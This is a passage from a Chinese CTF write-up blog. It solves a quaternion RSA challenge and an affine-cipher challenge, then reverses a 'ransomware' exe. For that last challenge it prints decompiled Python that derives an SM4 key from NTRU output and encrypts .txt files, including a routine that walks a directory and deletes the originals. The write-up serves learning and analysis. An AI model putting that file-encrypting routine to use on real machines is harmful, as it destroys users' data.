class="built_in">print</span>(<span class="string">&#x27;gift =&#x27;</span>,hints*keys%P)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;P =&#x27;</span>,P)  </span><br><span class="line">  </span><br><span class="line">e = <span class="number">65547</span>  </span><br><span class="line">m = ComComplex([bytes_to_long(flag[i:i+<span class="built_in">len</span>(flag)//<span class="number">4</span>+<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="built_in">len</span>(flag)//<span class="number">4</span>+<span class="number">1</span>)])  </span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)  </span><br></pre></td></tr></table></figure>
<p>这个显然是一个四元数的RSA问题，那么我们首先需要分解出$n$，设hint为$h$，keys为$k$，gifts为$g$，则在模$P$的四元数下有：</p>
<script type="math/tex; mode=display">
g=hk</script><p>我们知道，四元数$a+bi+cj+dk$可以通过一个方阵等价表示：</p>
<script type="math/tex; mode=display">
a+bi+cj+dk\leftrightarrow
\left(\begin{matrix}
a&b&c&d\\
-b&a&-d&c\\
-c&d&a&-b\\
-d&-c&b&a
\end{matrix}\right)</script><p>而四元数的乘法也可以等价地转换为矩阵的乘法，设$h$对应矩阵$H$，$k$对应矩阵$K$，$h$对应矩阵$G$，则上述计算可以等价于$G=HK$，这样的话我们就可以通过矩阵求逆得到$K$，从而得到$p,q,r$了（之后的操作都会将四元数处理为数组）：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">h = [<span class="number">375413371936</span>, <span class="number">452903063925</span>, <span class="number">418564633198</span>, <span class="number">452841062207</span>]</span><br><span class="line">g = [<span class="number">8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729</span>, <span class="number">20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171</span>, <span class="number">22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868</span>, <span class="number">40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863</span>]</span><br><span class="line">P = <span class="number">8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109</span></span><br><span class="line">n = <span class="number">408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367</span></span><br><span class="line"></span><br><span class="line">H = matrix(Zmod(P),</span><br><span class="line">[[h[<span class="number">0</span>], h[<span class="number">1</span>], h[<span class="number">2</span>], h[<span class="number">3</span>]],</span><br><span class="line">[-h[<span class="number">1</span>], h[<span class="number">0</span>], -h[<span class="number">3</span>], h[<span class="number">2</span>]],</span><br><span class="line">[-h[<span class="number">2</span>], h[<span class="number">3</span>], h[<span class="number">0</span>], -h[<span class="number">1</span>]],</span><br><span class="line">[-h[<span class="number">3</span>], -h[<span class="number">2</span>], h[<span class="number">1</span>], h[<span class="number">0</span>]]])</span><br><span class="line"></span><br><span class="line">G = matrix(Zmod(P),</span><br><span class="line">[[g[<span class="number">0</span>], g[<span class="number">1</span>], g[<span class="number">2</span>], g[<span class="number">3</span>]],</span><br><span class="line">[-g[<span class="number">1</span>], g[<span class="number">0</span>], -g[<span class="number">3</span>], g[<span class="number">2</span>]],</span><br><span class="line">[-g[<span class="number">2</span>], g[<span class="number">3</span>], g[<span class="number">0</span>], -g[<span class="number">1</span>]],</span><br><span class="line">[-g[<span class="number">3</span>], -g[<span class="number">2</span>], g[<span class="number">1</span>], g[<span class="number">0</span>]]])</span><br><span class="line"></span><br><span class="line">K = H^-<span class="number">1</span> * G</span><br><span class="line">_, p, q, r = K[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> ZZ(p) * ZZ(q) * ZZ(r) == n</span><br><span class="line"></span><br><span class="line">p, q, r = ZZ(p), ZZ(q), ZZ(r)</span><br></pre></td></tr></table></figure><br>在此之后就要求解四元数RSA了，已知四元数可以用一个四阶方阵来表示，那么我们从<a target="_blank" rel="noopener" href="https://mathoverflow.net/questions/109483/maximal-order-of-elements-in-gln-p">gr.group theory - maximal order of elements in GL(n,p) - MathOverflow</a>中很容易知道在模$n=pqr$下的最大阶应为$\varphi=(p^4-1)(q^4-1)(r^4-1)$，但是在这里$(65547, \varphi)=9$，而且通过测试可以知道：</p>
<script type="math/tex; mode=display">
(65547, p^4-1)=(65547, q^4-1)=(65547, r^4-1)=3</script><p>我们猜测flag分块之后不可能大于$p,q,r$中任意一个，那么我们可以考虑尝试将该线性群的阶缩减为$\varphi/27$，此时通过普通的矩阵RSA就可以求得flag：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = [<span class="number">212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103</span>, <span class="number">24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825</span>, <span class="number">45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125</span>, <span class="number">96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385</span>]</span><br><span class="line"></span><br><span class="line">C = matrix(Zmod(n),</span><br><span class="line">[[c[<span class="number">0</span>], c[<span class="number">1</span>], c[<span class="number">2</span>], c[<span class="number">3</span>]],</span><br><span class="line">[-c[<span class="number">1</span>], c[<span class="number">0</span>], -c[<span class="number">3</span>], c[<span class="number">2</span>]],</span><br><span class="line">[-c[<span class="number">2</span>], c[<span class="number">3</span>], c[<span class="number">0</span>], -c[<span class="number">1</span>]],</span><br><span class="line">[-c[<span class="number">3</span>], -c[<span class="number">2</span>], c[<span class="number">1</span>], c[<span class="number">0</span>]]])</span><br><span class="line"></span><br><span class="line">e = <span class="number">65547</span></span><br><span class="line">phi = (p**<span class="number">4</span> - <span class="number">1</span>)*(q**<span class="number">4</span> - <span class="number">1</span>)*(r**<span class="number">4</span> - <span class="number">1</span>)//<span class="number">27</span></span><br><span class="line"></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">M = C^d</span><br><span class="line"></span><br><span class="line">res = M[<span class="number">0</span>]</span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> res:</span><br><span class="line">    flag += long_to_bytes(ZZ(x))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></p>
<h3 id="reed"><a href="#reed" class="headerlink" title="reed"></a>reed</h3><blockquote>
<p>据说我的解法是非预期</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>)  </span><br><span class="line">flag = flag.rstrip(<span class="string">&#x27;&#125;&#x27;</span>).lstrip(<span class="string">&#x27;XYCTF&#123;&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">table = string.ascii_letters + string.digits  </span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(i <span class="keyword">in</span> table <span class="keyword">for</span> i <span class="keyword">in</span> flag)  </span><br><span class="line">r = random.Random()  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PRNG</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):  </span><br><span class="line">        self.a = <span class="number">1145140</span>  </span><br><span class="line">        self.b = <span class="number">19198100</span>  </span><br><span class="line">        random.seed(seed)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):  </span><br><span class="line">        x = random.randint(self.a, self.b)  </span><br><span class="line">        random.seed(x ** <span class="number">2</span> + <span class="number">1</span>)  </span><br><span class="line">        <span class="keyword">return</span> x  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">round</span>(<span class="params">self, k</span>):  </span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k):  </span><br><span class="line">            x = self.<span class="built_in">next</span>()  </span><br><span class="line">        <span class="keyword">return</span> x  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, a, b</span>):  </span><br><span class="line">    c = [(a * table.index(m) + b) % <span class="number">19198111</span> <span class="keyword">for</span> m <span class="keyword">in</span> msg]  </span><br><span class="line">    <span class="keyword">return</span> c  </span><br><span class="line">  </span><br><span class="line">seed = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;give me seed: &#x27;</span>))  </span><br><span class="line">prng = PRNG(seed)  </span><br><span class="line">a = prng.<span class="built_in">round</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))  </span><br><span class="line">b = prng.<span class="built_in">round</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))  </span><br><span class="line">enc = encrypt(flag, a, b)  </span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure>
<p>有个仿射，而且我们知道字母表下标的范围，直接爆破参数$a$以及第一个字母就可以了（下面是种子为1的数据）：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">table = string.ascii_letters + string.digits  </span><br><span class="line">  </span><br><span class="line">enc = [<span class="number">10021509</span>, <span class="number">10021509</span>, <span class="number">13396490</span>, <span class="number">1722743</span>, <span class="number">10021509</span>, <span class="number">13396490</span>, <span class="number">13616146</span>, <span class="number">16991127</span>, <span class="number">14667921</span>, <span class="number">6091782</span>, <span class="number">17765529</span>, <span class="number">12067342</span>, <span class="number">4542978</span>, <span class="number">16991127</span>, <span class="number">16216725</span>, <span class="number">3768576</span>, <span class="number">16991127</span>, <span class="number">15442323</span>, <span class="number">15442323</span>, <span class="number">4542978</span>, <span class="number">17765529</span>, <span class="number">14390548</span>, <span class="number">16216725</span>, <span class="number">1942399</span>, <span class="number">6091782</span>, <span class="number">7917959</span>, <span class="number">4542978</span>, <span class="number">11292940</span>, <span class="number">15442323</span>, <span class="number">10021509</span>, <span class="number">12622088</span>, <span class="number">10021509</span>, <span class="number">12622088</span>, <span class="number">5097724</span>, <span class="number">10021509</span>, <span class="number">2497145</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> trange(<span class="number">114514</span>, <span class="number">19198100</span>):  </span><br><span class="line">    inva = inverse(a, <span class="number">19198111</span>)  </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):  </span><br><span class="line">        b = (enc[<span class="number">0</span>] - a * x) % <span class="number">19198111</span>  </span><br><span class="line">        <span class="keyword">if</span> b &gt; <span class="number">1145140</span> <span class="keyword">and</span> b &lt; <span class="number">19198100</span>:  </span><br><span class="line">            <span class="keyword">try</span>:  </span><br><span class="line">                flag = <span class="string">&#x27;&#x27;</span>.join([table[(inva * (x - b)) % <span class="number">19198111</span>] <span class="keyword">for</span> x <span class="keyword">in</span> enc])  </span><br><span class="line">                <span class="built_in">print</span>(flag)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">            <span class="keyword">except</span>:  </span><br><span class="line">                <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p>
<h3 id="勒索病毒（复现）"><a href="#勒索病毒（复现）" class="headerlink" title="勒索病毒（复现）"></a>勒索病毒（复现）</h3><p>给出一个exe，但是它的图标是：<br><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504102115091.png" alt="Pasted image 20250410113323"><br>看不出来是什么语言编译的，用DIE扫出来是C/C++：<br><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504102115066.png" alt="Pasted image 20250410113519"><br>拖进IDA里面看看，随便翻翻翻到：<br><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504102115104.png" alt="Pasted image 20250410113656"><br>有段代码提到了PyInstaller，初步判断是Python编译的，用pyinstxtractor解包可以得到task.pyc和res文件夹里的enc.txt和pub_key.txt，通过pycdc反编译得到如下代码（以下代码为反编译结果经过处理得到的)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm4  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad  </span><br><span class="line"><span class="keyword">import</span> binascii  </span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randrange  </span><br><span class="line">  </span><br><span class="line">N = <span class="number">49</span> </span><br><span class="line">p = <span class="number">3</span>  </span><br><span class="line">q = <span class="number">128</span>  </span><br><span class="line">d = <span class="number">3</span>  </span><br><span class="line"><span class="keyword">assert</span> q &gt; (<span class="number">6</span> * d + <span class="number">1</span>) * p  </span><br><span class="line">R.&lt;x&gt; = ZZ[]  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_T</span>(<span class="params">d1, d2</span>):  </span><br><span class="line">    <span class="keyword">assert</span> N &gt;= d1 + d2  </span><br><span class="line">    s = [<span class="number">1</span>] * d1 + [-<span class="number">1</span>] * d2 + [<span class="number">0</span>] * (N - d1 - d2)  </span><br><span class="line">    shuffle(s)  </span><br><span class="line">    <span class="keyword">return</span> R(s)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_mod_prime</span>(<span class="params">f, p</span>):  </span><br><span class="line">    Rp = R.change_ring(Integers(p)).quotient(x^N - <span class="number">1</span>)  </span><br><span class="line">    <span class="keyword">return</span> R(lift(<span class="number">1</span> / Rp(f)))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convolution</span>(<span class="params">f, g</span>):  </span><br><span class="line">    <span class="keyword">return</span> (f * g) % (x^N - <span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift_mod</span>(<span class="params">f, q</span>):  </span><br><span class="line">    <span class="keyword">return</span> R([((f[i] + q // <span class="number">2</span>) % q) - q // <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)])  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_mod</span>(<span class="params">f, q</span>):  </span><br><span class="line">    <span class="keyword">return</span> R([f[i] % q <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)])  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_mod_pow2</span>(<span class="params">f, q</span>):  </span><br><span class="line">    <span class="keyword">assert</span> q.is_power_of(<span class="number">2</span>)  </span><br><span class="line">    g = invert_mod_prime(f, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        r = lift_mod(convolution(g, f), q)  </span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:  </span><br><span class="line">            <span class="keyword">return</span> g  </span><br><span class="line">        g = lift_mod(convolution(g, <span class="number">2</span> - r), q)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_message</span>():  </span><br><span class="line">    <span class="keyword">return</span> R([randrange(p) - <span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(N)])  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>():  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            f = generate_T(d + <span class="number">1</span>, d)  </span><br><span class="line">            g = generate_T(d, d)  </span><br><span class="line">            Fp = poly_mod(invert_mod_prime(f, p), p)  </span><br><span class="line">            Fq = poly_mod(invert_mod_pow2(f, q), q)  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        <span class="keyword">except</span>:  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line">    h = poly_mod(convolution(Fq, g), q)  </span><br><span class="line">    <span class="keyword">return</span> h, (f, g)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_message</span>(<span class="params">m, h</span>):  </span><br><span class="line">    e = lift_mod(p * convolution(h, generate_T(d, d)) + m, q)  </span><br><span class="line">    <span class="keyword">return</span> e  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_ntru_keys</span>():  </span><br><span class="line">    h, secret = generate_key()  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pub_key.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        f.write(<span class="built_in">str</span>(h))  </span><br><span class="line">    m = generate_message()  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;priv_key.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        f.write(<span class="built_in">str</span>(m))  </span><br><span class="line">    e = encrypt_message(m, h)  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;enc.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        f.write(<span class="built_in">str</span>(e))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">terms</span>(<span class="params">poly_str</span>):  </span><br><span class="line">    terms = []  </span><br><span class="line">    pattern = <span class="string">r&#x27;([+-]?\s*x\^?\d*|[-+]?\s*\d+)&#x27;</span>  </span><br><span class="line">    matches = re.finditer(pattern, poly_str.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>))  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:  </span><br><span class="line">        term = <span class="keyword">match</span>.group()  </span><br><span class="line">        <span class="keyword">if</span> term == <span class="string">&#x27;+x&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;x&#x27;</span>:  </span><br><span class="line">            terms.append(<span class="number">1</span>)  </span><br><span class="line">        <span class="keyword">elif</span> term == <span class="string">&#x27;-x&#x27;</span>:  </span><br><span class="line">            terms.append(-<span class="number">1</span>)  </span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x^&#x27;</span> <span class="keyword">in</span> term:  </span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">0</span>]  </span><br><span class="line">            exponent = <span class="built_in">int</span>(term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">1</span>])  </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:  </span><br><span class="line">                coeff = <span class="number">1</span>  </span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">                coeff = -<span class="number">1</span>  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                coeff = <span class="built_in">int</span>(coeff_part)  </span><br><span class="line">            terms.append(coeff * exponent)  </span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">in</span> term:  </span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x&#x27;</span>)[<span class="number">0</span>]  </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:  </span><br><span class="line">                terms.append(<span class="number">1</span>)  </span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">                terms.append(-<span class="number">1</span>)  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                terms.append(<span class="built_in">int</span>(coeff_part))  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="keyword">if</span> term == <span class="string">&#x27;+1&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;1&#x27;</span>:  </span><br><span class="line">                terms.append(<span class="number">0</span>)  </span><br><span class="line">                terms.append(-<span class="number">0</span>)  </span><br><span class="line">    <span class="keyword">return</span> terms  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">poly_terms</span>):  </span><br><span class="line">    binary = [<span class="number">0</span>] * <span class="number">128</span>  </span><br><span class="line">    <span class="keyword">for</span> term <span class="keyword">in</span> poly_terms:  </span><br><span class="line">        exponent = <span class="built_in">abs</span>(term)  </span><br><span class="line">        <span class="keyword">if</span> term &gt; <span class="number">0</span> <span class="keyword">and</span> exponent &lt;= <span class="number">127</span>:    </span><br><span class="line">            binary[<span class="number">127</span> - exponent] = <span class="number">1</span>  </span><br><span class="line">    binary_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, binary))  </span><br><span class="line">    hex_key = <span class="built_in">hex</span>(<span class="built_in">int</span>(binary_str, <span class="number">2</span>))[<span class="number">2</span>:].upper().zfill(<span class="number">32</span>)  </span><br><span class="line">    <span class="keyword">return</span> hex_key  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_polynomial_from_file</span>(<span class="params">filename</span>):  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:  </span><br><span class="line">        <span class="keyword">return</span> file.read().strip()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_encrypt</span>(<span class="params">key, plaintext</span>):  </span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">16</span>, <span class="string">&quot;SM4 key must be 16 bytes&quot;</span>  </span><br><span class="line">    cipher = sm4.CryptSM4()  </span><br><span class="line">    cipher.set_key(key, sm4.SM4_ENCRYPT)  </span><br><span class="line">    padded_plaintext = pad(plaintext, <span class="number">16</span>)  </span><br><span class="line">    <span class="keyword">return</span> cipher.crypt_ecb(padded_plaintext)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_encrypt_file</span>(<span class="params">input_path, output_path, key</span>):  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        plaintext = f.read()  </span><br><span class="line">      </span><br><span class="line">    ciphertext = sm4_encrypt(key, plaintext)  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        f.write(ciphertext)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resource_path</span>(<span class="params">relative_path</span>):  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">getattr</span>(sys, <span class="string">&#x27;frozen&#x27;</span>, <span class="literal">False</span>):  </span><br><span class="line">        base_path = sys._MEIPASS  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        base_path = os.path.abspath(<span class="string">&quot;.&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> os.path.join(base_path, relative_path)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_directory</span>(<span class="params">directory, sm4_key, extensions=[<span class="string">&quot;.txt&quot;</span>]</span>):  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(directory):  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Directory does not exist: <span class="subst">&#123;directory&#125;</span>&quot;</span>)  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(directory):  </span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:  </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(file.endswith(ext) <span class="keyword">for</span> ext <span class="keyword">in</span> extensions):  </span><br><span class="line">                input_path = os.path.join(root, file)  </span><br><span class="line">                output_path = input_path + <span class="string">&quot;.enc&quot;</span>  </span><br><span class="line">                <span class="keyword">try</span>:  </span><br><span class="line">                    sm4_encrypt_file(input_path, output_path, sm4_key)  </span><br><span class="line">                    os.remove(input_path)  </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Encrypted: <span class="subst">&#123;input_path&#125;</span> -&gt; <span class="subst">&#123;output_path&#125;</span>&quot;</span>)  </span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Error encrypting <span class="subst">&#123;input_path&#125;</span>: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        save_ntru_keys()  </span><br><span class="line">        poly_str = read_polynomial_from_file(<span class="string">&quot;priv_key.txt&quot;</span>)  </span><br><span class="line">        poly_terms = terms(poly_str)  </span><br><span class="line">        sm4_key = binascii.unhexlify(poly_terms)  </span><br><span class="line">        user_name = os.getlogin()  </span><br><span class="line">        target_dir = os.path.join(<span class="string">&quot;C:\\Users&quot;</span>, user_name, <span class="string">&quot;Desktop&quot;</span>, <span class="string">&quot;test_files&quot;</span>)  </span><br><span class="line">          </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):  </span><br><span class="line">            os.makedirs(target_dir, exist_ok=<span class="literal">True</span>)  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Created directory: <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span>  </span><br><span class="line">            txt_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(target_dir)   </span><br><span class="line">                    <span class="keyword">if</span> f.endswith(<span class="string">&#x27;.txt&#x27;</span>) <span class="keyword">and</span> os.path.isfile(os.path.join(target_dir, f))]  </span><br><span class="line">          </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> txt_files:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No .txt files found in directory&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span>  </span><br><span class="line">            <span class="keyword">for</span> txt_file <span class="keyword">in</span> txt_files:  </span><br><span class="line">            file_path = os.path.join(target_dir, txt_file)  </span><br><span class="line">            <span class="keyword">try</span>:  </span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                    test_data = f.read()  </span><br><span class="line">                  </span><br><span class="line">                ciphertext = sm4_encrypt(sm4_key, test_data)  </span><br><span class="line">                encrypted_path = file_path + <span class="string">&#x27;.enc&#x27;</span>  </span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(encrypted_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                f.write(ciphertext)  </span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Error processing <span class="subst">&#123;txt_file&#125;</span>: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)  </span><br><span class="line">                  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Fatal error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
